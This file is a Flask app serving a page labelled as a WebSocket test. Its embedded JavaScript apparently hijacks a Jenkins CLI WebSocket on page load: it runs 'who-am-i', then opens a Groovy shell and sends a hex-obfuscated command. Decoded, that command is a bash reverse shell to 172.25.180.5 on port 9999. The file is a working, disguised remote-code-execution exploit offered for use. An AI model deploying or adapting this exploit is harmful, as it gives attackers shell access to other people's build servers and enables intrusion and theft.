from flask import Flask, render_template_string

app = Flask(__name__)

@app.route('/')
def index():
    # Define the HTML page with embedded JavaScript
    html_content = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>WebSocket Test</title>
        <script>
            // Set the WebSocket URL and origin
            const url = "ws://localhost:8080/cli/ws"; // Change this to your WebSocket URL
            const originHeader = "http://localhost:8080"; // Change this to the correct origin if needed

            // Function to convert IP address to a UTF-8 encoded byte array
            function ipToHexArray(ipString) {
                const hexArray = new Uint8Array(ipString.length);
                for (let i = 0; i < ipString.length; i++) {
                    hexArray[i] = ipString.charCodeAt(i);
                }
                return hexArray;
            }

            // Create the first WebSocket connection
            const ws1 = new WebSocket(url);
            ws1.onopen = function() {
                console.log("First WebSocket Connected");

                const command = new TextEncoder().encode("who-am-i");
                console.log(command);

                // Define the start and end frames
                const start = new Uint8Array([0x00, 0x00, 0x08]);
                const end = new Uint8Array([0x02, 0x00, 0x05, 0x55, 0x54, 0x46, 0x2d, 0x38, 0x01, 0x00, 0x05, 0x65, 0x6e, 0x5f, 0x55, 0x53]);

                // Combine the frames
                const commandFrame = new Uint8Array(start.length + command.length + end.length);
                commandFrame.set(start);
                commandFrame.set(command, start.length);
                commandFrame.set(end, start.length + command.length);

                // Send the frames
                ws1.send(commandFrame);
                console.log("Command sent (ws1)");

                ws1.send(new Uint8Array([0x03]));
                console.log("Start signal sent (ws1)");

                ws1.onmessage = function(event) {
                    const decoder = new TextDecoder('utf-8');
                    const decodedMessage = decoder.decode(event.data);
                    console.log(`Message from ws1: ${decodedMessage}`);
                };

                ws1.onclose = function() {
                    console.log("First WebSocket closed");
                };
            };

            ws1.onerror = function(error) {
                console.error("WebSocket 1 error:", error);
            };

            // Create the second WebSocket connection
            const ws2 = new WebSocket(url);
            ws2.onopen = function() {
                console.log("Second WebSocket Connected");

                const ip = "172.25.180.5";
                const IP_encoded = ipToHexArray(ip);
                console.log(IP_encoded);

               // Define the start and end frames
                const command_hex = new Uint8Array([
                0x00, 0x00, 0x63, 0x5b, 0x27, 0x62, 0x61, 0x73, 0x68, 0x27, 0x2c, 0x20, 0x27, 0x2d, 0x63, 0x27,
                0x2c, 0x20, 0x27, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x20, 0x2d, 0x63, 0x20,
                0x5c, 0x27, 0x62, 0x61, 0x73, 0x68, 0x20, 0x2d, 0x69, 0x20, 0x3e, 0x26, 0x20, 0x2f, 0x64, 0x65,
                0x76, 0x2f, 0x74, 0x63, 0x70, 0x2f, ...IP_encoded,
                0x2f, 0x39, 0x39, 0x39, 0x39, 0x20, 0x30, 0x3e, 0x26, 0x31, 0x5c, 0x27,
                0x27, 0x5d, 0x2e, 0x65, 0x78, 0x65, 0x63, 0x75, 0x74, 0x65, 0x28, 0x29, 0x2e, 0x77, 0x61, 0x69,
                0x74, 0x46, 0x6f, 0x72, 0x28, 0x29
                ]);
                console.log(command_hex);

                ws2.send(new Uint8Array([0x00, 0x00, 0x08, 0x67, 0x72, 0x6f, 0x6f, 0x76, 0x79, 0x73, 0x68]));
                console.log("Start signal sent (ws2)");

                ws2.send(command_hex);
                console.log("Command sent (ws2)");

                ws2.send(new Uint8Array([0x02, 0x00, 0x05, 0x55, 0x54, 0x46, 0x2d, 0x38]));
                ws2.send(new Uint8Array([0x01, 0x00, 0x05, 0x65, 0x6e, 0x5f, 0x55, 0x53]));
                ws2.send(new Uint8Array([0x03]));
                console.log("Final signal sent (ws2)");

                ws2.onmessage = function(event) {
                    const decoder = new TextDecoder('utf-8');
                    const decodedMessage = decoder.decode(event.data);
                    console.log(`Message from ws2: ${decodedMessage}`);
                };

                ws2.onclose = function() {
                    console.log("Second WebSocket closed");
                };
            };

            ws2.onerror = function(error) {
                console.error("WebSocket 2 error:", error);
            };
        </script>
    </head>
    <body>
        <h1>WebSocket Connection Test</h1>
        <p>Open your browser's console to see WebSocket interactions.</p>
    </body>
    </html>
    """
    # Render the HTML content as the response
    return render_template_string(html_content)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
